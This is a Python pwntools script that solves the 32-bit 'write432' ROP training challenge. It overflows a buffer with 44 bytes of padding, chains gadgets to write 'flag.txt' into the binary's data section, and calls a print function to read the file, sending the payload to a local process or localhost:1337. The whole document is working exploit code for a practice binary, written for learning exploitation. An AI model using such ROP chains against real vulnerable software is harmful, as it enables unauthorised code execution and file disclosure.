from pwn import *

def start():
        global chall
        if args.REMOTE:
                chall = remote('localhost', 1337)
        else:
                chall = elf.process()
                #chall = gdb.debug(elf.path, gdbscript=gdbscript)

context.binary = elf = ELF('./write432')
start()


payload = b'A' * 44

pop_edi_ebp = p32(0x080485aa)
data_section_addr = 0x804a018
value = [b'flag',b'.txt']
mov_edi_ebp = p32(0x08048543)
print_addr = p32(0x80483D0)


for i in range(2):
    payload += pop_edi_ebp
    payload += p32(data_section_addr + i * 4)
    payload += value[i]
    payload += mov_edi_ebp

payload += print_addr   
payload += p32(0xdeadbeef)
payload += p32(data_section_addr)
payload += b'\n'
with open("input.txt", "wb") as f:
    f.write(payload)
chall.sendlineafter(b'> ',payload) 
chall.interactive()





